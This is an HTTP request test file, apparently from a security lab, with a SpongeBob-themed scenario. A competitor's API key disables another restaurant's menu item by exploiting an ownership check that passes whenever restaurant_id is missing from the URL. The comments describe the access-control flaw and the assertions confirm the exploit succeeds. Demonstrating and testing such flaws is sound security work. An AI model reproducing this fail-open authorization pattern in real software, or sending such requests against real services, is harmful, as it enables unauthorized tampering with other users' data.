# @import ../common/setup.http
@base = {{base_host}}/v303

### Step 1: Plankton verifies the Krabby Patty is available
# @name menu_before
GET {{base}}/menu

{{
  const item = menu_before.response.body.find(i => i.item_id == 1);
  exports.is_available = item.available;
}}

### Exploit: Menu Sabotage
# Plankton (Chum Bucket Manager) tries to disable the Krabby Patty (Krusty Krab Item).
# The decorator checks for `restaurant_id` in the URL to verify ownership.
# But this route (`/menu/<item_id>`) DOES NOT have `restaurant_id` in the URL.
# The decorator defaults to "Pass", and Plankton successfully sabotages the menu.
# @name exploit
PATCH {{base}}/menu/1
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
  "available": false
}

# Verification: The Krabby Patty is now unavailable.
?? status == 200
GET {{base}}/menu
?? js response.body.find(i => i.item_id == 1).available == false
